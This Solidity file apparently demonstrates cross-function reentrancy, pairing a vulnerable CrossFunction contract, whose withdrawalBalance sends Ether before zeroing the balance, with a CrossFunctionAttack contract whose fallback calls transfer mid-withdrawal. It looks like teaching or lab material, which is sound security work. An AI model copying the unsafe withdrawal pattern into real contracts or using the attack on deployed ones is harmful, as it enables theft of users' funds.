// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.4.22 <0.9.0;

contract CrossFunction {
    mapping(address => uint256) public userBalances;

    // constructor() payable {}

    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }

    /* uses userBalance to transfer funds */
    function transfer(address to, uint256 amount) public {
        if (userBalances[msg.sender] >= amount) {
            userBalances[to] += amount;
            userBalances[msg.sender] -= amount;
        }
    }

    /* uses userBalances to withdraw funds */
    function withdrawalBalance() public {
        uint256 amountToWithdraw = userBalances[msg.sender];

        // require(msg.sender.send(amountToWithdraw)());

        (bool sent, ) = msg.sender.call{value: amountToWithdraw}("");
        require(sent, "Failed to send Ether");
        userBalances[msg.sender] = 0;
    }

    function getBalance(address addr) public view returns (uint256) {
        return userBalances[addr];
    }
}

contract CrossFunctionAttack {
    CrossFunction public crossFunction;

    constructor(address _etherStoreAddress) {
        crossFunction = CrossFunction(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        // if (address(crossFunction).balance >= 1 ether) {
        crossFunction.transfer(address(300), 10);
        // }
    }

    function attack() external payable {
        // require(msg.value >= 1 ether);
        // crossFunction.deposit{value: 1 ether}();
        crossFunction.withdrawalBalance();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
